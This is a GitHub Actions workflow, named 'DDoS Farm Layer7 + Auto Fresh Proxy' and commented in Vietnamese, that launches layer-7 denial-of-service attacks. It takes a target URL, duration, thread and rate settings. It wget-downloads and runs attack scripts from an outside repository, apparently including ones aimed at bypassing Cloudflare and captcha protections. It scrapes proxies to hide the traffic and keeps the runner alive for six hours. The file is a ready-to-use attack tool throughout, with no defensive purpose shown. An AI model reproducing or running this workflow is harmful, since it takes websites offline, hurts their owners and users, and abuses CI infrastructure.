name: DDoS Farm Layer7 + Auto Fresh Proxy

on:
  workflow_dispatch:
    inputs:
      method:
        description: 'Method (1-4)'
        required: true
        default: '2'
        type: choice
        options: ['1','2','3','4']
      target:
        description: 'Target URL'
        required: true
      time:
        description: 'Time (giây)'
        required: true
        default: '1800'
      threads:
        description: 'Threads'
        required: true
        default: '128'
      rate:
        description: 'Rate'
        required: true
        default: '256'

jobs:
  attack:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/setup-node@v4
        with:
          node-version: 20
      - uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Download tools (raw link đúng)
        run: |
          wget -q https://raw.githubusercontent.com/112jb/mlonghehe/main/cf.js
          wget -q https://raw.githubusercontent.com/112jb/mlonghehe/main/captcha.js
          wget -q https://raw.githubusercontent.com/112jb/mlonghehe/main/uam.js
          wget -q https://raw.githubusercontent.com/112jb/mlonghehe/main/run.py
          wget -q https://raw.githubusercontent.com/112jb/mlonghehe/main/proxy.js
          chmod +x *

      - name: Lấy proxy tươi (fix 100% không lỗi)
        run: |
          echo "Đang lấy proxy tươi 2025..."
          node proxy.js || echo "Lỗi nhẹ proxy.js nhưng vẫn tiếp tục bắn (dùng proxy cũ nếu có)"
          if [ -f proxy.txt ]; then
            echo "Đã lấy thành công $(wc -l < proxy.txt) proxy!"
          else
            echo "Không lấy được proxy → dùng không proxy hoặc tạo file rỗng"
            touch proxy.txt
          fi

      - name: Bắn Layer7
        run: |
          nohup python3 run.py << EOF
          2
          1
          ${{ inputs.method }}
          ${{ inputs.target }}
          ${{ inputs.time }}
          ${{ inputs.threads }}
          ${{ inputs.rate }}
          proxy.txt
          EOF

      - name: Keep alive 6 tiếng
        run: sleep 21600
